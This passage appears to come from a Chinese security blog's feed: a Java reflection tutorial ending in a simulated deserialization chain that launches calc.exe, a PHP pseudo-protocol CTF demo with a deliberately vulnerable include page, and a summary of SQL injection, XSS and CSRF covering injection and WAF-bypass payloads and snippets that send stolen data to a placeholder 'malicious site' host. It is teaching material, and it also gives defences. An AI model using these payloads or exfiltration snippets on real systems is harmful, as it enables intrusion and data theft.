可以看到成功将String类型对象放入泛型为int型的数组中： 2、利用反射，简化编写Servlet的个数利用反射机制，在为程序添加新功能时可以无需逐个对应编写新的Servlet，提高开发效率和代码简洁性。主要有如下两个方式优化。 （1）、通过编写利用反射机制获取指定属性值的Servlet的方式 每次从页面传过来一个参数，method=”xxx”; 然后编写一个Servlet，获得其参数method的值，进行判断，如果是add，则调用add方法，如果是delete，则调用delete方法，这样就可以写在一个servlet中实现所有的功能了。 （2）、通过Servlet的生命周期即service()实现反射机制来实现 编写一个通用的BaseServlet，继承于HttpServlet： 编写具体实现的方法Servlet类MyServlet001，继承于BaseServlet： 由Servlet的生命周期可知，在访问该Servlet时会调用service()方法，然而MyServlet001类中并无service()，因此会返回到父类BaseServlet中找到该service()方法，再获取参数从而知道需要调用的方法，因为方法的编写都在子类中，所以通过反射，获取到子类中对应的方法并运行，其中需要注意的是this这个参数在BaseServlet中的用法。 3、利用反射，构造链式结构的反序列化漏洞利用payload在经典的Apache Commons Collections反序列化漏洞中，其payload的构造正是利用了反射机制来实现链式结构，将要执行的恶意代码构造成一条反射链，再通过包含自定义readObject()方法的类来触发执行。 这里简单模拟一下该反序列化漏洞场景，代码示例如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import java.io.*;public class ReflectionPlay implements Serializable &#123; public static void main(String[] args) throws Exception &#123; ReflectionPlay rp = new ReflectionPlay(); rp.deserialize(rp.serialize(rp.getObject())); &#125; //构造链式结构的ReflectionChains类对象并复制到ReadObject类对象中，返回该恶意对象 public Object getObject() &#123; String command = "calc.exe"; Object firstObject = Runtime.class; ReflectionObject[] reflectionChains = &#123; //调用Runtime.class的getMethod方法，寻找getRuntime方法，得到一个Method对象(getRuntime方法) //等同于Runtime.class.getMethod("getRuntime",new Class[]&#123;String.class,Class[].class&#125;) new ReflectionObject("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), //调用Method的invoker方法可以得到一个Runtime对象，等同于method.invoke(null)，静态方法不用传入对象 new ReflectionObject("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), //调用RunTime对象的exec方法，并将command作为参数执行命令 new ReflectionObject("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;command&#125;) &#125;; return new ReadObject(new ReflectionChains(firstObject, reflectionChains)); &#125; //序列化对象到byte数组 public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; //从byte数组中反序列化对象 public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125; //定义一个有漏洞的类，主要提供的功能是根据自己属性中的值来进行反射调用 class ReflectionObject implements Serializable&#123; private String methodName; private Class[] paramTypes; private Object[] args; public ReflectionObject(String methodName, Class[] paramTypes, Object[] args) &#123; this.methodName = methodName; this.paramTypes = paramTypes; this.args = args; &#125; //根据methodName、paramTypes来寻找对象的方法，利用args作为参数进行调用 public Object transform(Object input) throws Exception &#123; Class inputClass = input.getClass(); return inputClass.getMethod(methodName, paramTypes).invoke(input, args); &#125; &#125; //定义一个反射链的类 class ReflectionChains implements Serializable&#123; private Object firstObject; private ReflectionObject[] reflectionObjects; public ReflectionChains(Object firstObject, ReflectionObject[] reflectionObjects) &#123; this.firstObject = firstObject; this.reflectionObjects = reflectionObjects; &#125; //遍历ReflectionObject类对象数组并调用其transform()方法 public Object execute() throws Exception &#123; Object concurrentObject = firstObject; for (ReflectionObject reflectionObject : reflectionObjects) &#123; concurrentObject = reflectionObject.transform(concurrentObject); &#125; return concurrentObject; &#125; &#125; //定义一个用于序列化与反序列化的类,拥有一个属性和一个重写了的readObject()方法，并且在readObject()方法中执行了该属性的一个方法 //当反序列化该类对象时会执行自定义的readObject()方法 class ReadObject implements Serializable &#123; private ReflectionChains reflectionChains; public ReadObject(ReflectionChains reflectionChains) &#123; this.reflectionChains = reflectionChains; &#125; //自定义readObject()，当反序列化的时候，这个代码会被调用，且被调用的时候其属性都是空 private void readObject(java.io.ObjectInputStream stream) throws IOException, ClassNotFoundException &#123; try &#123; //用来模拟当readObject()的时候，对自身的属性进行了一些额外的操作，以符合反序列化漏洞特征 reflectionChains= (ReflectionChains) stream.readFields().get("reflectionChains",null); reflectionChains.execute(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 运行后弹出计算器，即利用了反射机制实现系统命令执行： 参考Java中反射机制详解 Java反射机制Reflection]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP伪协议]]></title>
    <url>%2F2019%2F01%2F31%2FPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[基本概念PHP伪协议在CTF中经常使用到，这里写个简单的Demo小结一下，主要对file://、php://filter、php://input、data://、zip://、compress.bzip2://、compress.zlib://、phar://等协议进行简单的Demo介绍分析。 简单说一下，file://用于访问本地文件系统读取本地文件；php://访问各个输入/输出流（I/O streams），其中php://filter用于读取文件内容，php://input可以访问请求的原始数据的只读流、同时可将post请求中的数据作为PHP代码执行；zip://，bzip2://，zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名；data://即写入数据；phar://即PHP归档。 简单文件包含Demo代码demo.php 1234567&lt;?php echo '&lt;h3&gt;Hi, just a test for php pseudo protocol. :)&lt;/h3&gt;'; echo '&lt;p&gt;u can input a param called "file" by GET method.&lt;/p&gt;'; if(isset($_GET["file"]))&#123; @include($_GET["file"]); &#125;?&gt; 正常访问，提示可以通过GET传入一个file参数包含文件： file://协议file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件且不受allow_url_fopen与allow_url_include的影响。 注意：该协议的路径只能输入绝对路径，输入相对路径是不生效的。 先输入一个文本文件，可以读到该文件内容，比如CTF经常遇到的flag： 输入php或JS文件，file://协议会执行该PHP文件里的代码而不是显示该内容，因而该协议不适用于获取文件内容源代码（而常用php://filter伪协议）： php://协议php://访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 不需要开启allow_url_fopen，仅php://input、php://stdin、 php://memory和php://temp需要开启allow_url_include。 php://filter协议php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用。在CTF中主要用于读取文件内容。不需要开启allow_url_fopen和allow_url_include。 查看之前的test.js文件与PHP文件： php://input协议php://input可以访问请求的原始数据的只读流，在CTF中多用于执行php代码。 不需要开启allow_url_fopen和allow_url_include。 data://协议data://即数据，在CTF中主要用于写入代码并包含该代码到当前页面中。 必须同时开启allow_url_fopen和allow_url_include。 使用形式如下： data:text/plain;base64, \alert(‘xss’)\ data://text/plain;base64, \alert(‘xss’)\ data:text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= data://text/plain;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= zip://、bzip2://、zlib://协议zip://、bzip2://、zlib://均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。 不需要开启allow_url_fopen和allow_url_include。 zip://协议zip://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： zip:// [压缩文件绝对路径]#[压缩文件内的子文件名] 文件路径必须为绝对路径。 上传一个包含PHP代码文件的zip包，只要zip://访问该协议即触发文件包含漏洞、将任意文本文件中的内容当作PHP代码执行： 当然可以修改上传的zip文件后缀名为其他如图片后缀，根据特定情况可绕过一些上传文件类型的限制： zlib://协议zlib://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： compress.zlib://file 文件无绝对路径限制。 bzip2://协议bzip2://压缩流，不需要开启allow_url_fopen和allow_url_include。 使用方法： compress.bzip2://file 文件无绝对路径限制。 可是这里怎么测试都不成功，通过phpinfo查看bzip2://是enable且文件类型和文件路径都进行尝试，PHP版本也换了几个，还是无法显示phpinfo信息，哪位知道原因的大佬请指点一下 : ) phar://协议phar://即PHP归档，常用于解析phar文件内容，最近的CTF中多用于phar反序列化漏洞利用。反序列化漏洞具体的利用可参考https://blog.csdn.net/SKI_12/article/details/85551194]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见Web漏洞类型总结]]></title>
    <url>%2F2019%2F01%2F30%2F%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[这里小结一下常见的Web漏洞类型，待完善。 SQL注入与SQL盲注一、基本概念漏洞定义 SQL注入漏洞作为OWASP TOP10中重要的一部分，可见其安全性的危害有多大。简单地说，SQL注入就是通过构建特殊的具有SQL语法的语句，绕到数据库中进而执行相应的操作的漏洞。攻击者利用这个问题，可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击。 成因 针对SQL注入的攻击行为可描述为通过在用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的： 程序编写者在处理应用程序和数据库交互时，使用字符串拼接的方式构造SQL语句 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中 攻击方式 SQL注入的攻击方式根据应用程序处理数据库返回内容的不同，可以分为基于报错的注入、基于布尔的注入和盲注。 ​ 基于报错的注入：数据库查询返回结果并没有在页面中显示，但是应用程序将数据库报错信息打印到了页面中，所以攻击者可以构造数据库报错语句，从报错信息中获取想要获得的内容，如注入各种符号以及组合： ‘ “ ( % ​ 基于布尔的注入：攻击者可以直接在当前界面内容中获取想要获得的内容，如注入：1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0，当返回的结果不同时即有漏洞 盲注：数据库查询结果无法从直观页面中获取，攻击者通过使用数据库逻辑或使数据库库执行延时等方法获取想要获得的内容 ​ 判断盲注的常见用法： 121’ and 1=1 #1’ and 1=2 # ​ 判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。 ​ 基于布尔的注入代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 --+ ​ 基于报错的注入代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=0 union select 1,count(*),concat((select email_id from emails where id=5),0x2a,floor(rand(0)*2))x from users group by x--+ ​ 盲注代码示例： 1http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select substr(email_id,1,1) from emails where id=3) &gt; 'a' --+ 几个常用的函数 ​ user()返回当前数据库连接使用的用户； ​ database()返回当前数据库连接使用的数据库； ​ version()返回当前数据库的版本； ​ concat或者concat-ws函数可以将这些函数进行组合使用并显示出来。concat函数中，将其中的参数直接连接起来产生新的字符串。而在concat_ws函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。以其常用的例子为例： 1concat_ws(char(32,58,32),user(),database(),version()) ​ 其中char()函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:)，通过这样的方式可以绕过一些简单的过滤机制。 几个常用的全局函数 ​ @@datadir @@hostname @@VERSION @@version_compile_os 危害 攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如：管理员后台密码），从而脱取数据库中内容（脱库）。在特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。 二、绕过WAF的方法1、大小写绕过 ​ 如：?id=1’ uNiOn SElecT * FrOm users # 2、简单编码绕过 ​ 如URL编码、双重URL编码、Hex编码、Unicode编码等。 ​ ?id=1%252f%252a*/UNION%252f%252a /SELECT ​ id=-15 /!u%6eion/ /!se%6cect/ 1,2,3,4… ​ ?id=10%D6‘%20AND%201=2%23 ​ SELECT ‘Ä’=’A’; #1 3、注释绕过 ​ 如?id=1 uni//on sele//ct 1,2,3 # 4、分隔重写绕过 ​ 适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。 5、HTTP参数污染(HPP)： ​ 如?id=1 union select 1,2,3 from users where id=1 # ​ 这时可以改为?id=1 union select 1&amp;id=2,3 from users where id=1 # ​ 次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ； ​ 这个例子也同理：?id=1//union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=/users # ​ 如果服务器代码为： select from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit /from users # 可以看到，这种方式比较适合白盒测试。 6、使用逻辑运算符 or /and 绕过 ​ 如?id=1 or 0x50=0x50 ​ ?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写， ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。 7、比较操作符替换 ​ 比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。 8、同功能函数替换 ​ substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的； ​ ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换； ​ 在使用在基于延时的盲注中benchmark()和sleep()可以相互替换； ​ group_concat 、 concat 、concat_ws 三者可以互相替换； ​ 还有一种新的方法 ，3条语句分别如下 123substring((select ‘password’),1,1) = 0x70substr((select ‘password’),1,1) = 0x70mid((select ‘password’),1,1) = 0x70 ​ 都是从 password 里判断第一个字符的值，可以用 123strcmp(left(‘password’,1), 0x69) = 1strcmp(left(‘password’,1), 0x70) = 0strcmp(left(‘password’,1), 0x71) = -1 ​ 替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。 9、盲注无需or和and ​ 例句：index.php?id=1 ​ 当and和or被过滤时，可以将 1修改为是通过语句生成的， index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123，123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。 10、加括号 ​ 如?id=(1)union(select(1),mid(hash,1,32)from(users)) ​ ?id=(1)union(((((((select(1),hex(hash)from(users)))))))) ​ ?id=(1)or(0x50=0x50) 11、缓冲区溢出绕过 ​ 如id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 # ​ 其中 A 越多越好，一般要求 1000 个以上。 三、检测方法1、基于报错的检测方法 使用各种符号以及组合： ‘ “ ( % 如直接在URL后添加单引号看是否报错index.php?id=1’ 2、基于布尔的检测 最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0 当返回的结果不同时即有漏洞 3、直接在URL地址后面加-1、-0、’%2B’和’%2B’a 添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞； 添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞； 添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。 4、判断盲注的常用方法 1’ and 1=1 # 1’ and 1=2 # 判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。 四、防御方法关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。 常用的修复方案 （1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。 （2）过滤危险的 SQL 语句关键字。 （3）确认每种数据的类型。 （4）数据长度应该严格规定。 （5）网站每个数据层的编码统一。 （6）严格限制网站用户的数据库的操作权限。 （7）避免网站显示 SQL 错误信息。 （8）在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测。 （9）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。 其实最有效的防御手段是下面两种： 1、预编译 原理是采用PreparedStatement将相应的SQL语句预先编译好，即SQL引擎会预先进行语法分析，产生语法树，生成执行计划，从而无论用户输入什么内容即使是sql命令都不会影响该SQL语句的语法结构而只能当成是字符串字面值参数。但并不是所有场景都能采用SQL预编译的，如需要进行一些字符串拼接的方式，这时便需要严格检查参数的数据类型以及采用一些安全函数来处理。 其过程如下: （1）定义预编译的sql语句，其中待填入的参数用?占位。 （2）创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。 （3）填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）。 （4）执行预处理对象。 例子： 1234String sql=&quot;select id,no from user where id=?&quot;;PreparedStatement ps = conn.prepareStatement(sql);prestmt.setInt(1,id);prestmt.executeQuery(); 2、变量绑定 是指在sql语句的条件中使用变量而不是常量，是为了减少解析的。具体的细节网上很多，后面再补充。 XSS（跨站脚本）一、基本概念漏洞定义 跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 ​ XSS，全称cross-site scripting，是用于攻击Web客户端而不是服务器端，其最大的特点是能把恶意的JS或HTML代码注入到用户浏览的网页上。而XSS漏洞的存在，主要是由于Web应用程序对用户的输入没有进行严格的过滤所导致的，当攻击者把恶意代码注入到网页时，用户只要访问该网页就会执行其中的恶意代码。 成因 造成XSS漏洞的原因就是，攻击者的输入没有经过严格的控制，最终显示给来访的用户，攻击者通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java,VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、个人网页内容、会话和cookie等各种内容。 类型 主要分为以下前3种。 ​ 反射型（非持久）：主要用于将恶意代码附加到URL地址的参数中，常用于窃取客户端cookie信息和钓鱼欺骗。 ​ 存储型（持久型）：攻击者将恶意代码注入到Web服务器中并保存起来，只要客户端访问了相应的页面就会受到攻击。 ​ DOM型：利用浏览器的DOM特性，不是向浏览器发请求而是直接通过在本地执行从而修改或窃取本地的信息。 ​ Flash型：利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。​ mXSS型：又被叫做突变XSS，主要被用于绕过XSS过滤。用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得一串看似没有任何危害的HTML代码，最终将进入某个DOM节点的innerHTML中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 使用场景 ​ 直接嵌入html script标签中 ​ 元素标签事件 1&lt;body onload=alert(‘xss’)&gt; ​ 图片标签 img ​ 框架标签 iframe ​ DOM对象 利用方式 ​ 窃取用户cookie来非法登录访问目标站点； XSS与CSRF漏洞结合利用，使受害者在不知不觉中用用户的账号进行转账等敏感危险操作； ​ XSS蠕虫； ​ 执行恶意JS代码实现键盘记录； ​ 内嵌恶意HTML代码到页面中； ​ 页面恶意重定向； ​ 利用XSS进行DDOS，参考：SOHU视频XSS漏洞导致其用户成为DDOS肉鸡。 二、绕过WAF的方法利用&lt;&gt;标记注入HTML或JS 1&lt;script&gt;alert(‘xss’)&lt;/script&gt; 利用HTML标签属性值执行XSS 很多的HTML标记中的属性都支持javascript:[code]伪协议的形式 1&lt;img src=”javascript:alert('xss');”&gt; 空格回车TAB 空白不会影响JS语句的在正常执行 1&lt;img src=”javas cript:alert('xss')” width=100&gt; 对标签属性值进行转码 HTML属性值本身是支持ASCII码形式的 1&lt;img src=”javascript:alert('xss')” width=100&gt; ​ 其中t的ASCII码值为116，用“&amp;#116”来表示，而冒号:的ASCII值为58。 ​ 另外，Tab符的ASCII码为&amp;#9、换行符的为&amp;#10、回车符的为&amp;#13可以被插入到代码的任何地方中去。 ​ 还可以将&amp;#01、&amp;#02等字符插入到JavaScript的头部中。 产生自己的事件 ​ 事件是用户或浏览器自身执行的某个动作，如Click等 1&lt;img src=http://10.10.10.137/alan.jpg onerror=alert('xss')&gt; ​ onerror是img标签的一个事件，只要页面发生错误就会激活相应的事件。 ​ 除此之外还有各种事件，如：onResume、onfinish、onstop、onReverse等等。 利用CSS跨站剖析 ​ CSS是XSS的另一个载体，代码通常是嵌入到style标签/属性中的。 ​ 缺点是个浏览器之间不能通用。 扰乱过滤规则 转换大小写，顺序可以随意 双引号与单引号互换 不使用引号 注释符号 内嵌 字符编码 可以对代码进行十进制编码（&amp;#），可以在每个十进制字符后面加上分号；，也可以采用&amp;#0、&amp;#00；等的形式。 ​ JS中的eval()函数，用于计算字符串并执行其中的JS代码。可以使用\连接十六进制字符串形式的脚本让eval()函数来执行，如 1&lt;script&gt;eval(“\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29”);&lt;/script&gt; ​ 也可以让其执行十进制形式的脚本，但需要和String.fromCharCode()函数一起使用、实现将字符转为ASCII值，如 1&lt;img src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"&gt; ​ 在利用CSS中，可以对style中的属性进行十六进制的编码来绕过。 Shellcode的调用 ​ 简单地说，Shellcode是指对一个漏洞进行利用的代码。 动态调用远程JS 将shellcode保存在其他服务器中，然后再用script标签来动态加载。除此之外，还可以通过基于DOM的方法创建和插入结点，把代码注入到网页中。这两种方式在利用中都有相应的演示。 使用window.location.hash ​ 即DOM型。location是JS管理地址栏的内置对象，location.hash则是用来获取或设置页面的标签值。相关的简单的利用已有示例，至于DOM型的XSS会有进一步的笔记。 三、检测方法​ 寻找脚本程序的输出显示代码，搜索关键字，显示输出那个变量，跟踪变量是否被过滤。 ​ 可以先输入一些内容，页面返回之后，可以查看网页源代码，搜索内容关键字看看是不是直接返回在页面的HTML代码中。 四、防御方法1、调用函数 ​ 对于用户提交的数据可以通过调用函数进行过滤，htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好；str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过。 2、使用XSS Filter （1）输入过滤 ​ 输入验证（客户端）：前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。缺点就是容易被修改掉。 ​ 数据消毒（服务器端）：过滤敏感字符（可以和SQL注入的一同过滤），如&lt; &gt; javascript ‘ “ &amp; # expression等。 （2） 输出编码（服务器端） ​ 可以使用HTML编码（PHP的htmlspecialchars()函数、ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数），用对应的HTML实体替代字面量字符，此时浏览器会将恶意代码当作HTML文档的内容而不是结构加以处理。 常见恶意字符的HTML编码（显示、实体名字、实体编号）： &lt; &lt;; &amp;#60； > &gt; &amp;#62； &amp; &amp; &amp;#38； “ “ &amp;#34； ‘ ‘ 3、白名单和黑名单结合 4、Noscript ​ Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本。 5、Anti_XSS ​ 提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义。 6、HttpOnly ​ 攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。 ​ PHP设置HttpOnly的方法： ​ （1） 修改php.ini文件，设置其值为1或TRUE； ​ （2） setcookie()函数和setrawcookie()函数的第七个参数； ​ （3）在PHP代码中开启。 7、Web安全编码规范 ​ 对敏感字符转义、URL属性进行相应的规定等。 8、尽量使用WAF 9、防御DOM型XSS DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到 1&lt;script&gt; 则进行JS编码。 CSRF（跨站请求伪造）一、基本概念漏洞定义 跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。 成因 由于程序员的不严谨导致Web应用程序存在漏洞 Web浏览器对Cookie和HTTP身份验证等会话信息的处理存在缺陷 漏洞利用的前提 用户已经完成身份认证 新请求的提交不需要重新身份认证或确认机制 攻击者必须了解Web APP请求的参数构 用户会被吸引去点击链接 CSRF与XSS的区别与关系 XSS主要利用用户对站点的信任，而CSRF主要是利用站点对已知身份认证的信任。换句话说，XSS是用户自己点击链接来访问相应的网页的，而CSRF是在用户并不知情的情况下来提交请求的。另外，两者的产生的原因也不一样，CSRF的是因为采用了隐式的认证方式，而XSS的是因为对用户输入没有进行有效的过滤。 两者均利用用户的会话执行某些操作；若一个站点存在XSS漏洞，则很大可能也存在CSRF漏洞；若CSRF的恶意代码存在于第三方的站点，即使能有效地过滤用户的输入而防止XSS，也未必能防御CSRF。 攻击方式 GET型与POST型CSRF：主要取决于相应操作对提交方式的限制，其原理都是事先构造出一个恶意的请求，然后诱导用户点击或访问，从而假借用户身份完成相应的操作。另外，有些POST型CSRF也可能会利用javascript进行自动提交表单完成操作。 Flash型CSRF：通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如: Flash跨域权限管理文件设置为允许所有主机/域名跨域对本站进行读写数据： 1234This XML file does not appear to have any style information associated with it. The document tree is shown below.&lt;cross-domain-policy&gt; &lt;allow-access-from domain="*"/&gt;&lt;/cross-domain-policy&gt; Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF。 CSRF蠕虫：CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如：某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大！ 二、CSRF攻击获取数据的方法要获取的关键数据：用户 id、用户昵称、用户 email、用户个人页面地址等。 同域内 CSRF 攻击获取数据几乎没任何限制。 跨域 CSRF 攻击获取数据的几种方法总结如下： 1、结合XSS 组合漏洞 利用XSS 获取数据，如之前关于XSS文章做的三方的演示，使用目标站点上的XSS 漏洞： 1&lt;iframe width=0 height=0 src=‘http://目标站点/search.php?k=“&gt;&lt;script src=http://恶意站点/get.js&gt;&lt;/script&gt;’&gt;&lt;/iframe&gt; 其中get.js 的代码为： 12//use DOM method to get your datanew Image(). src=‘http://恶意站点/a.php?data=‘+data; 恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。 2、JSON Hijacing 目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。 相关代码： 12345&lt;script&gt; function hijack(o)&#123;//use DOM method to get your datanew Image().src="http://192.168.1.2/JSONHiJack.asp?hi="+escape(data);&#125;&lt;/script&gt;&lt;script src=http://api.fanfou.com/private_messages/inbox.json?callback=hijack&amp;count=2&gt;&lt;/script&gt; 3、Flash AsctionScript（crossdomain.xml） 前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的 AS脚本进行跨域请求。 1234&lt;?xml version="1.0"?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain="*" /&gt;&lt;/cross-domain-policy&gt; 相关代码： 1234import flash.net.*; var _l = new URLLoader(new URLRequest(“http://目标站点/"));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); 4、服务端代理技术 三、检测方法最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。另外还需要确认数据包中确实没有含有token字样，即使有也尝试去掉再发包看是否是进行有效的CSRF校验即可。 一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。 以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 